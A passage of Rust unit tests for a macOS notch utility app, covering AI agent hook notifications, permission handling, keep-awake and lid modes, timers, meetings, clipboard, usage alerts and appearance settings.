        assert!(c.view(T0 + 1).agents.sessions.is_empty());
    }

    #[test]
    fn agent_lifecycle_shows_working_then_notifies_when_done_or_waiting() {
        let mut c = core();
        hook(
            &mut c,
            json!({"hook_event_name":"UserPromptSubmit","session_id":"s1","cwd":"/work/api","prompt":"fix it"}),
            T0,
        );
        let v = c.view(T0);
        assert_eq!(
            (v.compact.kind, v.compact.title.as_str(), v.compact.count),
            (ActivityKind::Agent, "api", 1)
        );

        hook(
            &mut c,
            json!({"hook_event_name":"Stop","session_id":"s1","cwd":"/work/api","last_assistant_message":"All tests pass\u{202E}."}),
            T0 + 10,
        );
        let banner = c.view(T0 + 10).inbox.banner.unwrap();
        assert_eq!(banner.title, "api finished");
        assert_eq!(banner.body, "All tests pass\u{FFFD}.");
        cmd(&mut c, Command::NotifyDismissBanner, T0 + 11);

        hook(
            &mut c,
            json!({"hook_event_name":"Notification","session_id":"s1","cwd":"/work/api","notification_type":"idle_prompt","message":"Claude is waiting"}),
            T0 + 20,
        );
        let banner = c.view(T0 + 20).inbox.banner.unwrap();
        assert_eq!(
            (banner.title.as_str(), banner.priority),
            ("api needs input", Priority::High)
        );
        // The same session replaces its earlier notification instead of stacking.
        assert_eq!(
            c.view(T0 + 20)
                .inbox
                .history
                .iter()
                .filter(|n| n.source == "agent")
                .count(),
            1
        );

        // Other notification types and a Stop without a message are fine.
        hook(
            &mut c,
            json!({"hook_event_name":"Notification","session_id":"s1","notification_type":"auth_success"}),
            T0 + 21,
        );
        hook(
            &mut c,
            json!({"hook_event_name":"Stop","session_id":"s2"}),
            T0 + 22,
        );
        assert!(c
            .view(T0 + 22)
            .inbox
            .history
            .iter()
            .any(|n| n.title == "Agent finished" && n.body == "Ready for your next prompt."));
    }

    #[test]
    fn bad_hook_payloads_and_a_disabled_agent_module_are_ignored() {
        let mut c = core();
        assert_eq!(c.hook("not json", T0), (HookOutcome::Ack, vec![]));
        let mut s = Settings::default();
        s.agent.enabled = false;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        let (outcome, fx) = hook(
            &mut c,
            json!({"hook_event_name":"Stop","session_id":"s1","cwd":"/w/p"}),
            T0,
        );
        assert_eq!((outcome, fx.len()), (HookOutcome::Ack, 0));
        assert!(c.view(T0).inbox.history.is_empty());
    }

    #[test]
    fn auto_allowed_tools_are_answered_without_a_prompt() {
        let mut c = core();
        let mut s = Settings::default();
        s.agent.auto_allow_tools = vec!["Read".into()];
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        let (outcome, _) = hook(
            &mut c,
            json!({"hook_event_name":"PermissionRequest","session_id":"s","cwd":"/w/p","tool_name":"Read","tool_input":{"file_path":"/a"}}),
            T0,
        );
        assert_eq!(outcome, HookOutcome::Decided(Decision::Allow));
        assert_eq!(uses(&c, Feature::AgentRequest), 0);
    }

    #[test]
    fn caffeine_toggle_timer_and_power_monitoring() {
        let mut c = core();
        assert_eq!(
            cmd(&mut c, Command::CaffeineToggle, T0),
            vec![Effect::SetAssertion(AwakeMode::Display)]
        );
        assert!(c.wants_power_updates());
        assert_eq!(c.view(T0).compact.kind, ActivityKind::Caffeine);
        assert_eq!(
            cmd(&mut c, Command::CaffeineToggle, T0 + 1),
            vec![Effect::SetAssertion(AwakeMode::Off)]
        );
        assert!(!c.wants_power_updates());

        cmd(
            &mut c,
            Command::CaffeineActivate {
                mode: AwakeMode::System,
                duration_secs: Some(60),
            },
            T0 + 2,
        );
        assert_eq!(c.view(T0 + 2).compact.ends_at_ms, Some(T0 + 60_002));
        assert_eq!(
            c.apply(Input::Tick, T0 + 60_002),
            vec![Effect::SetAssertion(AwakeMode::Off)]
        );
        assert_eq!(
            cmd(
                &mut c,
                Command::CaffeineActivate {
                    mode: AwakeMode::Off,
                    duration_secs: None
                },
                T0 + 3
            ),
            vec![]
        );
        assert_eq!(uses(&c, Feature::CaffeineOn), 2);
    }

    #[test]
    fn lid_mode_asks_the_platform_and_low_battery_turns_it_off() {
        let mut c = core();
        let fx = cmd(&mut c, Command::CaffeineLid { on: true }, T0);
        assert_eq!(
            fx,
            vec![Effect::SetAssertion(AwakeMode::Display), Effect::EnableLid]
        );
        assert_eq!(c.view(T0).caffeine.lid, LidState::Pending);
        c.apply(Input::LidResult { ok: true }, T0 + 1);
        let v = c.view(T0 + 1);
        assert_eq!(
            (v.caffeine.lid, v.compact.value.as_str()),
            (LidState::On, "lid")
        );

        let fx = c.apply(
            Input::Power(PowerStatus {
                on_ac: false,
                battery_pct: Some(20),
            }),
            T0 + 2,
        );
        assert_eq!(fx, vec![Effect::DisableLid]);
        let v = c.view(T0 + 2);
        assert_eq!(v.caffeine.lid, LidState::Off);
        assert!(v.caffeine.guard.is_some());
        assert_eq!(v.inbox.banner.unwrap().source, "caffeine");

        let fx = c.apply(
            Input::Power(PowerStatus {
                on_ac: false,
                battery_pct: Some(5),
            }),
            T0 + 3,
        );
        assert_eq!(fx, vec![Effect::SetAssertion(AwakeMode::Off)]);
        assert_eq!(uses(&c, Feature::LidModeOn), 1);
    }

    #[test]
    fn a_failed_or_late_lid_result_is_handled() {
        let mut c = core();
        cmd(&mut c, Command::CaffeineLid { on: true }, T0);
        c.apply(Input::LidResult { ok: false }, T0 + 1);
        assert_eq!(c.view(T0 + 1).caffeine.lid, LidState::Off);
        assert_eq!(
            c.view(T0 + 1).inbox.banner.unwrap().title,
            "Lid mode failed"
        );
        // The password prompt was answered after lid mode was cancelled.
        cmd(&mut c, Command::CaffeineLid { on: true }, T0 + 2);
        assert_eq!(
            cmd(&mut c, Command::CaffeineLid { on: false }, T0 + 3),
            vec![Effect::DisableLid]
        );
        assert_eq!(
            c.apply(Input::LidResult { ok: true }, T0 + 4),
            vec![Effect::DisableLid]
        );
    }

    #[test]
    fn usage_is_shown_and_alerts_fire_once_per_level() {
        let mut c = core();
        let status = |pct: f64| {
            Input::Statusline(json!({"rate_limits":{"five_hour":{"used_percentage":pct,"resets_at":1_700_010_000},"seven_day":{"used_percentage":10.0}},"model":{"display_name":"Fable"}}).to_string())
        };
        c.apply(status(50.0), T0);
        let v = c.view(T0);
        assert_eq!(v.usage.five_hour.as_ref().unwrap().used_pct, 50.0);
        assert_eq!(v.usage.model.as_deref(), Some("Fable"));
        assert!(v.inbox.history.is_empty());

        c.apply(status(81.0), T0 + 1);
        c.apply(status(82.0), T0 + 2);
        let alerts = |c: &Core| {
            c.view(T0)
                .inbox
                .history
                .iter()
                .filter(|n| n.source == "usage")
                .map(|n| n.title.clone())
                .collect::<Vec<_>>()
        };
        assert_eq!(alerts(&c), ["5-hour limit at 81%"]);
        c.apply(status(96.0), T0 + 3);
        assert_eq!(
            alerts(&c),
            ["5-hour limit at 96%"],
            "the newer alert replaces the older one"
        );
        // After the window resets the alert is armed again.
        c.apply(status(3.0), T0 + 4);
        cmd(&mut c, Command::NotifyClear, T0 + 4);
        c.apply(status(85.0), T0 + 5);
        assert_eq!(alerts(&c), ["5-hour limit at 85%"]);
        // Garbage is ignored.
        c.apply(Input::Statusline("nope".into()), T0 + 6);
    }

    #[test]
    fn usage_alerts_can_be_disabled() {
        let mut c = core();
        let mut s = Settings::default();
        s.general.usage_alerts = false;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        c.apply(
            Input::Statusline(
                json!({"rate_limits":{"five_hour":{"used_percentage":99.0}}}).to_string(),
            ),
            T0,
        );
        assert!(c.view(T0).inbox.history.is_empty());
    }

    #[test]
    fn transcript_lines_add_to_todays_tokens_and_can_be_reset() {
        let mut c = core();
        let line = json!({"type":"assistant","timestamp":"2023-11-14T22:13:20Z","requestId":"r1",
            "message":{"id":"m1","model":"claude","usage":{"input_tokens":10,"output_tokens":20,"cache_read_input_tokens":30,"cache_creation_input_tokens":40}}}).to_string();
        let input = Input::UsageRecord {
            record: crate::usage::parse_record(&line).unwrap(),
            day_start_ms: T0 - 1000,
            day_end_ms: T0 + 86_400_000,
        };
        c.apply(input.clone(), T0);
        c.apply(input, T0);
        let today = c.view(T0).usage.today;
        assert_eq!(
            (
                today.input,
                today.output,
                today.cache_read,
                today.cache_write,
                today.messages
            ),
            (10, 20, 30, 40, 1)
        );
        c.apply(Input::UsageResetToday, T0);
        assert_eq!(c.view(T0).usage.today.messages, 0);
    }

    #[test]
    fn settings_are_applied_clamped_persisted_and_restored() {
        let mut c = core();
        let mut s = Settings::default();
        s.pomodoro.focus_secs = 1;
        s.pomodoro.utc_offset_secs = 12345;
        s.agent.approval_timeout_secs = 100_000;
        s.clipboard.max_items = 0;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        let applied = c.settings().clone();
        assert_eq!(applied.pomodoro.focus_secs, 10);
        assert_eq!(
            applied.pomodoro.utc_offset_secs, 0,
            "the offset is not user-editable"
        );
        assert_eq!(applied.agent.approval_timeout_secs, 120);
        assert_eq!(applied.clipboard.max_items, 1);
        assert!(c.take_dirty());
        assert_eq!(uses(&c, Feature::SettingsChange), 1);

        let restored = Core::new(c.persisted());
        assert_eq!(restored.settings(), &applied);
        assert_eq!(
            uses(&restored, Feature::SettingsChange),
            1,
            "analytics survive a restart"
        );
        // Unknown or missing fields in an old file fall back to defaults.
        let old: Persisted = serde_json::from_str(
            r#"{"version":0,"settings":{"pomodoro":{"focus_secs":600},"future":1}}"#,
        )
        .unwrap();
        assert_eq!(Core::new(old).settings().pomodoro.focus_secs, 600);
    }

    #[test]
    fn the_utc_offset_moves_the_day_boundary() {
        let mut c = core();
        c.apply(Input::UtcOffset(-3600), T0);
        cmd(&mut c, Command::SetUtcOffset { secs: 7 * 3600 }, T0);
        assert_eq!(c.settings().pomodoro.utc_offset_secs, 7 * 3600);
        cmd(&mut c, Command::PanelOpened, T0);
        let day = c.persisted().analytics.days.keys().copied().next().unwrap();
        assert_eq!(day, day_index(T0, 7 * 3600));
    }

    #[test]
    fn panel_and_tab_opens_are_counted_and_analytics_can_be_cleared_or_disabled() {
        let mut c = core();
        cmd(&mut c, Command::PanelOpened, T0);
        for tab in [
            Tab::Home,
            Tab::Music,
            Tab::Timer,
            Tab::Clipboard,
            Tab::Agents,
            Tab::Inbox,
            Tab::Settings,
        ] {
            cmd(&mut c, Command::TabOpened { tab }, T0);
        }
        cmd(&mut c, Command::Refresh, T0);
        assert_eq!(c.view(T0).analytics.len(), 8);
        cmd(&mut c, Command::AnalyticsClear, T0);
        assert!(c.view(T0).analytics.is_empty());
        assert!(c.take_dirty());

        let mut s = Settings::default();
        s.analytics.enabled = false;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        c.take_dirty();
        cmd(&mut c, Command::PanelOpened, T0);
        assert!(c.view(T0).analytics.is_empty());
        assert!(!c.take_dirty(), "nothing is written when counting is off");
    }

    #[test]
    fn hook_install_state_is_reported() {
        let mut c = core();
        assert_eq!(c.view(T0).agents.hooks_installed, None);
        c.apply(Input::HooksInstalled(Some(true)), T0);
        assert_eq!(c.view(T0).agents.hooks_installed, Some(true));
    }

    #[test]
    fn commands_round_trip_through_json_in_the_shape_the_shell_sends() {
        let cases = [
            (r#"{"cmd":"pomodoro_toggle"}"#, Command::PomodoroToggle),
            (r#"{"cmd":"clip_copy","id":3}"#, Command::ClipCopy { id: 3 }),
            (
                r#"{"cmd":"media","action":"play_pause"}"#,
                Command::Media {
                    action: MediaCommand::PlayPause,
                },
            ),
            (
                r#"{"cmd":"agent_decide","request_id":"req-1","decision":"allow"}"#,
                Command::AgentDecide {
                    request_id: "req-1".into(),
                    decision: Decision::Allow,
                },
            ),
            (
                r#"{"cmd":"caffeine_activate","mode":"system","duration_secs":null}"#,
                Command::CaffeineActivate {
                    mode: AwakeMode::System,
                    duration_secs: None,
                },
            ),
            (
                r#"{"cmd":"tab_opened","tab":"inbox"}"#,
                Command::TabOpened { tab: Tab::Inbox },
            ),
        ];
        for (json, expected) in cases {
            assert_eq!(
                serde_json::from_str::<Command>(json).unwrap(),
                expected,
                "{json}"
            );
        }
        assert!(serde_json::from_str::<Command>(r#"{"cmd":"format_disk"}"#).is_err());
        let settings = Command::SetSettings {
            settings: Box::new(Settings::default()),
        };
        let json = serde_json::to_string(&settings).unwrap();
        assert_eq!(serde_json::from_str::<Command>(&json).unwrap(), settings);
    }

    #[test]
    fn helpers_format_as_expected() {
        assert_eq!(mmss(0), "0:00");
        assert_eq!(mmss(65), "1:05");
        assert_eq!(mmss(3600), "60:00");
        assert_eq!(phase_label(Phase::Idle), "Pomodoro");
        assert_eq!(phase_label(Phase::LongBreak), "Long break");
        assert_eq!(phase_label(Phase::ShortBreak), "Break");
    }

    #[test]
    fn a_click_after_waking_from_sleep_acts_on_caught_up_timers() {
        // The focus ended while the Mac slept; the first thing to arrive is a skip.
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        cmd(&mut c, Command::PomodoroSkip, T0 + 3 * 3_600_000);
        let v = c.view(T0 + 3 * 3_600_000);
        assert_eq!(
            v.pomodoro.completed_today, 1,
            "the finished focus is credited"
        );
        assert_eq!(uses(&c, Feature::PomodoroComplete), 1);
        assert!(v.inbox.history.iter().any(|n| n.title == "Focus complete"));

        // Same with pause: it must not freeze a phase that is already over.
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        cmd(&mut c, Command::PomodoroToggle, T0 + 3 * 3_600_000);
        assert_eq!(c.view(T0 + 3 * 3_600_000).pomodoro.completed_today, 1);
    }

    #[test]
    fn an_expired_request_cannot_be_answered_late() {
        let mut c = core();
        let id = permission(&mut c, "s1", "ls", T0);
        let fx = cmd(
            &mut c,
            Command::AgentDecide {
                request_id: id.clone(),
                decision: Decision::Allow,
            },
            T0 + 500_000,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: id,
                decision: Decision::Pass
            })]
        );
        assert_eq!(uses(&c, Feature::AgentAllow), 0);
    }

    #[test]
    fn repeated_status_lines_with_the_same_reading_do_not_change_the_view() {
        let mut c = core();
        let status = Input::Statusline(
            json!({"rate_limits":{"five_hour":{"used_percentage":40.0}}}).to_string(),
        );
        let minute = T0 - T0 % 60_000;
        c.apply(status.clone(), minute + 1_000);
        let a = serde_json::to_string(&c.view(minute + 1_000)).unwrap();
        c.apply(status, minute + 9_000);
        let b = serde_json::to_string(&c.view(minute + 9_000)).unwrap();
        assert_eq!(a, b);
    }

    #[test]
    fn a_meeting_shows_in_the_notch_and_announces_overtime_and_the_end() {
        let mut c = core();
        cmd(
            &mut c,
            Command::MeetingSet {
                title: "Review".into(),
                items: vec![
                    AgendaInput {
                        name: "Demo".into(),
                        minutes: 1,
                    },
                    AgendaInput {
                        name: "Feedback".into(),
                        minutes: 1,
                    },
                ],
            },
            T0,
        );
        assert!(c.take_dirty());
        cmd(&mut c, Command::MeetingToggle, T0);
        let v = c.view(T0);
        assert_eq!(v.compact.kind, ActivityKind::Meeting);
        assert_eq!(v.compact.title, "Demo");
        assert_eq!(v.compact.ends_at_ms, Some(T0 + 60_000));
        assert_eq!(c.next_deadline(), Some(T0 + 60_000));
        // The agenda cannot change mid-meeting.
        cmd(
            &mut c,
            Command::MeetingLoad {
                preset: "retro".into(),
            },
            T0 + 1,
        );
        assert_eq!(c.view(T0 + 1).meeting.title, "Review");

        c.apply(Input::Tick, T0 + 60_000);
        let banner = c.view(T0 + 60_000).inbox.banner.unwrap();
        assert_eq!(banner.title, "Time's up: Demo");
        assert_eq!(banner.body, "Next: Feedback");
        cmd(&mut c, Command::NotifyDismissBanner, T0 + 60_001);

        cmd(&mut c, Command::MeetingToggle, T0 + 70_000);
        assert_eq!(c.view(T0 + 70_000).compact.value, "Paused");
        cmd(&mut c, Command::MeetingNext, T0 + 80_000);
        cmd(&mut c, Command::MeetingNext, T0 + 100_000);
        let v = c.view(T0 + 100_000);
        assert_eq!(v.meeting.run_state, MeetingRun::Finished);
        assert_eq!(v.inbox.banner.unwrap().title, "Meeting finished");
        assert_ne!(v.compact.kind, ActivityKind::Meeting);
        assert_eq!(uses(&c, Feature::MeetingStart), 1);
        assert_eq!(uses(&c, Feature::MeetingFinish), 1);
        cmd(&mut c, Command::MeetingReset, T0 + 101_000);
        assert_eq!(c.view(T0 + 101_000).meeting.run_state, MeetingRun::Stopped);

        // The agenda survives a restart; the run does not.
        let back = Core::new(c.persisted());
        assert_eq!(back.view(T0).meeting.title, "Review");
        assert_eq!(back.view(T0).meeting.items.len(), 2);
    }

    #[test]
    fn a_picked_colour_is_copied_remembered_and_announced() {
        let mut c = core();
        let fx = cmd(
            &mut c,
            Command::ColorPicked {
                hex: "#ff9e0a".into(),
            },
            T0,
        );
        assert_eq!(fx, vec![Effect::WriteClipboard("#FF9E0A".into())]);
        assert_eq!(c.view(T0).inbox.banner.unwrap().title, "Copied #FF9E0A");
        assert!(cmd(&mut c, Command::ColorPicked { hex: "red".into() }, T0).is_empty());
        for i in 0..10 {
            cmd(
                &mut c,
                Command::ColorPicked {
                    hex: format!("00000{i}"),
                },
                T0 + 1,
            );
        }
        cmd(
            &mut c,
            Command::ColorPicked {
                hex: "#000003".into(),
            },
            T0 + 2,
        );
        let colors = c.view(T0 + 2).colors;
        assert_eq!(colors.len(), MAX_COLORS);
        assert_eq!(colors[0], "#000003");
        assert_eq!(colors.iter().filter(|c| *c == "#000003").count(), 1);
        assert_eq!(uses(&c, Feature::ColorPick), 12);
        // Saved, and junk in the saved file is dropped.
        let mut saved = c.persisted();
        assert_eq!(saved.colors, colors);
        saved.colors.push("nope".into());
        assert_eq!(Core::new(saved).view(T0).colors, colors);
    }

    #[test]
    fn appearance_settings_are_normalized() {
        assert_eq!(normalize_hex("abcdef").as_deref(), Some("#ABCDEF"));
        assert_eq!(normalize_hex(" #12aB9f ").as_deref(), Some("#12AB9F"));
        assert_eq!(normalize_hex("#12345"), None);
        assert_eq!(normalize_hex("#GGGGGG"), None);
        let mut c = core();
        let mut s = c.view(T0).settings;
        assert_eq!(s.appearance.theme, ThemeChoice::System);
        assert_eq!(s.appearance.accent, DEFAULT_ACCENT);
        assert_eq!(s.appearance.notch_style, NotchStyle::Attached);
        assert!(!s.general.all_screens);
        s.appearance.theme = ThemeChoice::Light;
        s.appearance.accent = "3366ff".into();
        s.appearance.notch_style = NotchStyle::Floating;
        s.general.all_screens = true;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s.clone()),
            },
            T0,
        );
        let v = c.view(T0).settings;
        assert_eq!(v.appearance.theme, ThemeChoice::Light);
        assert_eq!(v.appearance.accent, "#3366FF");
        assert_eq!(v.appearance.notch_style, NotchStyle::Floating);
        assert!(v.general.all_screens);
        s.appearance.accent = "not a colour".into();
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        assert_eq!(c.view(T0).settings.appearance.accent, DEFAULT_ACCENT);
        let json = serde_json::to_value(c.view(T0).settings.appearance).unwrap();
        assert_eq!(
            json,
            json!({"theme":"light","accent":DEFAULT_ACCENT,"notch_style":"floating","closed_notch":"dark","material":"solid"})
        );
        // Settings saved before the field existed load as the original look.
        let old: Appearance =
            serde_json::from_value(json!({"theme":"dark","accent":"#000000"})).unwrap();
        assert_eq!(old.notch_style, NotchStyle::Attached);
    }

    #[test]
    fn closed_notch_defaults_to_dark_and_can_follow_the_theme() {
        // Settings saved before the option existed keep the black notch.
        let old: Appearance =
            serde_json::from_value(json!({"theme":"light","accent":"#FF9E0A"})).unwrap();
        assert_eq!(old.closed_notch, ClosedNotch::Dark);
        assert_eq!(Appearance::default().closed_notch, ClosedNotch::Dark);
        let mut c = core();
        let mut s = c.view(T0).settings;
        s.appearance.closed_notch = ClosedNotch::Theme;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        let v = c.view(T0).settings.appearance;
        assert_eq!(v.closed_notch, ClosedNotch::Theme);
        assert_eq!(serde_json::to_value(v).unwrap()["closed_notch"], "theme");
    }

    #[test]
    fn the_appearance_options_persist_together_and_a_partial_file_loads() {
        let mut c = core();
        let mut s = c.view(T0).settings;
        s.appearance.notch_style = NotchStyle::Floating;
        s.appearance.closed_notch = ClosedNotch::Theme;
        s.appearance.material = Material::Glass;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        let again = Core::new(c.persisted()).view(T0).settings.appearance;
        assert_eq!(again.notch_style, NotchStyle::Floating);
        assert_eq!(again.closed_notch, ClosedNotch::Theme);
        assert_eq!(again.material, Material::Glass);
        // A settings file that names one option leaves the rest at the old look.
        let partial: Settings =
            serde_json::from_value(json!({"appearance":{"notch_style":"floating"}})).unwrap();
        assert_eq!(partial.appearance.notch_style, NotchStyle::Floating);
        assert_eq!(partial.appearance.closed_notch, ClosedNotch::Dark);
        assert_eq!(partial.appearance.material, Material::Solid);
        assert_eq!(partial.appearance.theme, ThemeChoice::System);
        assert_eq!(partial.appearance.accent, DEFAULT_ACCENT);
    }

    #[test]
    fn material_defaults_to_solid_and_round_trips() {
        let mut c = core();
        let mut s = c.view(T0).settings;
        assert_eq!(s.appearance.material, Material::Solid);
        s.appearance.material = Material::Glass;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        assert_eq!(c.view(T0).settings.appearance.material, Material::Glass);
        // Saved and restored.
        let saved = c.persisted();
        assert_eq!(saved.settings.appearance.material, Material::Glass);
        assert_eq!(
            Core::new(saved).view(T0).settings.appearance.material,
            Material::Glass
        );
        // Settings saved before the field existed read as Solid.
        let old: Appearance =
            serde_json::from_value(json!({"theme":"dark","accent":"#0A84FF"})).unwrap();
        assert_eq!(old.material, Material::Solid);
        assert_eq!(old.theme, ThemeChoice::Dark);
        assert_eq!(
            serde_json::to_value(Material::Glass).unwrap(),
            json!("glass")
        );
    }

    #[test]
    fn image_clips_copy_back_from_their_file_and_file_clips_list_paths() {
        let mut c = core();
        c.apply(
            Input::ClipCaptured(ClipCapture {
                kind: ClipKind::Image,
                text: "PNG image".into(),
                source_app: None,
                concealed: false,
                image_path: Some("/data/clips/img-1.png".into()),
                rich_path: None,
            }),
            T0,
        );
        c.apply(
            Input::ClipCaptured(ClipCapture {
                kind: ClipKind::Files,
                text: "/a/1.png\n/a/2.mov\n/a/3\n/a/4\n/a/5".into(),
                source_app: None,
                concealed: false,
                image_path: None,
                rich_path: None,
            }),
            T0 + 1,
        );
        let v = c.view(T0 + 1);
        let files = &v.clipboard.items[0];
        assert_eq!(files.files, ["/a/1.png", "/a/2.mov", "/a/3", "/a/4"]);
        assert_eq!(files.image_path, None);
        let image = &v.clipboard.items[1];
        assert_eq!(image.image_path.as_deref(), Some("/data/clips/img-1.png"));
        assert!(image.files.is_empty());
        let fx = cmd(&mut c, Command::ClipCopy { id: image.id }, T0 + 2);
        assert_eq!(
            fx,
            vec![Effect::WriteClipboardImage("/data/clips/img-1.png".into())]
        );
    }

    #[test]
    fn closing_the_lid_in_lid_mode_keeps_only_the_system_awake_and_sleeps_the_display() {
        let mut c = core();
        let ac = PowerStatus {
            on_ac: true,
            battery_pct: Some(90),
        };
        c.apply(Input::Power(ac), T0);
        cmd(
            &mut c,
            Command::CaffeineActivate {
                mode: AwakeMode::Display,
                duration_secs: None,
            },
            T0,
        );
        cmd(&mut c, Command::CaffeineLid { on: true }, T0);
        c.apply(Input::LidResult { ok: true }, T0);
        assert!(c.wants_clamshell_updates());
        let shut = |c: &mut Core, closed, external| {
            c.apply(
                Input::Clamshell {
                    closed,
                    external_display: external,
                },
                T0 + 1,
            )
        };
        assert!(shut(&mut c, false, false).is_empty());
        assert_eq!(
            shut(&mut c, true, false),
            vec![
                Effect::SetAssertion(AwakeMode::System),
                Effect::SleepDisplay
            ]
        );
        assert!(shut(&mut c, true, false).is_empty(), "reported once");
        // Changing the mode while shut stays system-only.
        let fx = cmd(
            &mut c,
            Command::CaffeineActivate {
                mode: AwakeMode::Display,
                duration_secs: Some(60),
            },
            T0 + 2,
        );
        assert!(
            fx.iter()
                .all(|e| *e != Effect::SetAssertion(AwakeMode::Display)),
            "{fx:?}"
        );
        // Opening it brings the display assertion back.
        assert_eq!(
            shut(&mut c, false, false),
            vec![Effect::SetAssertion(AwakeMode::Display)]
        );
        // With a monitor attached the display stays on (clamshell mode).
        assert!(shut(&mut c, true, true).is_empty());
    }

    #[test]
    fn the_lid_is_ignored_without_lid_mode_and_system_mode_needs_no_change() {
        let mut c = core();
        assert!(!c.wants_clamshell_updates());
        assert!(c
            .apply(
                Input::Clamshell {
                    closed: true,
                    external_display: false
                },
                T0
            )
            .is_empty());
        c.apply(
            Input::Power(PowerStatus {
                on_ac: true,
                battery_pct: Some(90),
            }),
            T0,
        );
        cmd(
            &mut c,
            Command::CaffeineActivate {
                mode: AwakeMode::System,
                duration_secs: None,
            },
            T0,
        );
        cmd(&mut c, Command::CaffeineLid { on: true }, T0);
        c.apply(Input::LidResult { ok: true }, T0);
        c.apply(
            Input::Clamshell {
                closed: false,
                external_display: false,
            },
            T0,
        );
        assert_eq!(
            c.apply(
                Input::Clamshell {
                    closed: true,
                    external_display: false
                },
                T0
            ),
            vec![Effect::SleepDisplay]
        );
    }

    #[test]
    fn the_countdown_timer_shows_in_the_notch_and_announces_the_end() {
        let mut c = core();
        cmd(&mut c, Command::TimerSet { secs: 90 }, T0);
        assert!(c.take_dirty());
        assert_eq!(c.view(T0).timer.duration_secs, 90);
        cmd(&mut c, Command::TimerToggle, T0);
        let v = c.view(T0);
        assert_eq!(v.compact.kind, ActivityKind::Timer);
        assert_eq!(v.compact.ends_at_ms, Some(T0 + 90_000));
        assert_eq!(c.next_deadline(), Some(T0 + 90_000));
        cmd(&mut c, Command::TimerToggle, T0 + 30_000);
        assert_eq!(c.view(T0 + 30_000).compact.value, "1:00");
        cmd(&mut c, Command::TimerAdd { secs: 60 }, T0 + 30_000);
        cmd(&mut c, Command::TimerToggle, T0 + 40_000);
        c.apply(Input::Tick, T0 + 160_000);
        let v = c.view(T0 + 160_000);
        assert_eq!(v.timer.run_state, TimerRun::Done);
        let banner = v.inbox.banner.unwrap();
        assert_eq!(
            (banner.title.as_str(), banner.body.as_str()),
            ("Timer done", "1 min 30 s is up.")
        );
        assert_ne!(v.compact.kind, ActivityKind::Timer);
        assert_eq!(uses(&c, Feature::TimerStart), 1);
        cmd(&mut c, Command::TimerReset, T0 + 161_000);
        assert_eq!(c.view(T0 + 161_000).timer.remaining_secs, 90);
        assert_eq!(Core::new(c.persisted()).view(T0).timer.duration_secs, 90);
        assert_eq!(
            Core::new(Persisted::default()).view(T0).timer.duration_secs,
            300
        );
    }

    #[test]
    fn duration_labels_read_naturally() {
        assert_eq!(duration_label(45), "45 s");
        assert_eq!(duration_label(300), "5 min");
        assert_eq!(duration_label(90), "1 min 30 s");
        assert_eq!(duration_label(3600), "1 h");
        assert_eq!(duration_label(5400), "1 h 30 min");
    }

    #[test]
    fn formatted_text_copies_back_with_formatting_or_plain_on_request() {
        let mut c = core();
        c.apply(
            Input::ClipCaptured(ClipCapture {
                kind: ClipKind::Text,
                text: "Bold words".into(),
                source_app: None,
                concealed: false,
                image_path: None,
                rich_path: Some("/data/clips/rich-1.rtf".into()),
            }),
            T0,
        );
        let item = c.view(T0).clipboard.items[0].clone();
        assert!(item.rich);
        assert_eq!(
            cmd(&mut c, Command::ClipCopy { id: item.id }, T0),
            vec![Effect::WriteClipboardRich {
                text: "Bold words".into(),
                path: "/data/clips/rich-1.rtf".into()
            }]
        );
        assert_eq!(
            cmd(&mut c, Command::ClipCopyPlain { id: item.id }, T0),
            vec![Effect::WriteClipboard("Bold words".into())]
        );
        assert!(cmd(&mut c, Command::ClipCopyPlain { id: 999 }, T0).is_empty());
        assert_eq!(c.clip_file_paths(), ["/data/clips/rich-1.rtf"]);
        text_only(&mut c);
    }

    fn text_only(c: &mut Core) {
        c.apply(text("plain"), T0 + 1);
        assert!(!c.view(T0 + 1).clipboard.items[0].rich);
    }

    #[test]
    fn notifications_say_where_a_click_goes() {
        let mut c = core();
        let mut s = c.view(T0).settings;
        s.notify.system = true;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        for title in ["one", "two"] {
            cmd(
                &mut c,
                Command::NotifySystem {
                    app: "Mail".into(),
                    title: title.into(),
                    body: String::new(),
                },
                T0,
            );
        }
        let v = c.view(T0);
        // Two banners from one app are both kept.
        assert_eq!(
            v.inbox
                .history
                .iter()
                .filter(|n| n.source == "Mail")
                .count(),
            2
        );
        assert_eq!(
            v.inbox.history[0].open,
            Some(OpenTarget::AppNamed {
                name: "Mail".into()
            })
        );

        // An agent notification opens the session's terminal.
        c.hook(
            &json!({"hook_event_name":"Stop","session_id":"s9","cwd":"/w/api",
                    "litenotch_app":"com.apple.Terminal","litenotch_tty":"ttys003"})
            .to_string(),
            T0 + 1,
        );
        let v = c.view(T0 + 1);
        let agent = v
            .inbox
            .history
            .iter()
            .find(|n| n.source == "agent")
            .unwrap();
        assert_eq!(
            agent.open,
            Some(OpenTarget::App {
                bundle_id: "com.apple.Terminal".into(),
                tty: Some("ttys003".into()),
            })
        );
        assert_eq!(
            v.agents.sessions[0].app.as_deref(),
            Some("com.apple.Terminal")
        );
        assert_eq!(v.agents.sessions[0].tty.as_deref(), Some("ttys003"));
        // The device is left out of the JSON when it is not known.
        let bare = OpenTarget::App {
            bundle_id: "com.apple.Terminal".into(),
            tty: None,
        };
        assert_eq!(
            serde_json::to_value(&bare).unwrap(),
            json!({"kind":"app","bundle_id":"com.apple.Terminal"})
        );

        // Without a known terminal it opens the Agents tab; own ones open their tab.
        c.hook(
